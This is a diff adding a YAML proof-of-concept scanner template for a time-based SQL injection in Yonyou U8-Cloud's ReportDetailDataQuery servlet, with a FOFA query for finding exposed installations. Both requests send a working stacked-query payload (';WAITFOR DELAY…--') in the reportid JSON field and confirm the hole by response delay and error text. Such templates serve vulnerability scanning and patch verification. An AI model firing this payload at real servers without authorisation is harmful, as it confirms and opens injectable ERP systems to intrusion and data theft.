@@ -1,0 +1,52 @@
+id: poc-yaml-yongyou-u8cloud-reportdetaildataquery-sqli
+info:
+  name: 用友U8-Cloud ReportDetailDataQuery SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 用友U8cloud
+  fofa: app="用友-U8-Cloud"
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: POST
+  path: /servlet/~iufo/nc.itf.iufo.mobilereport.data.ReportDetailDataQuery
+  headers:
+    Content-Type: application/json
+  data: '{"reportid":"'';WAITFOR DELAY ''0:0:{{.t1}}''--"}'
+  expression: 'status_code == 500 &&
+
+    contains(body,"Exception report") &&
+
+    contains(body,"java.lang.ArrayIndexOutOfBoundsException") &&
+
+    contains(body,"The server encountered an internal error") &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+- method: POST
+  path: /servlet/~iufo/nc.itf.iufo.mobilereport.data.ReportDetailDataQuery
+  headers:
+    Content-Type: application/json
+  data: '{"reportid":"'';WAITFOR DELAY ''0:0:{{.t3}}''--"}'
+  expression: 'status_code == 500 &&
+
+    contains(body,"Exception report") &&
+
+    contains(body,"java.lang.ArrayIndexOutOfBoundsException") &&
+
+    contains(body,"The server encountered an internal error") &&
+
+    duration >= t3 &&
+
+    duration <= t4
+
+    '
+transport: http
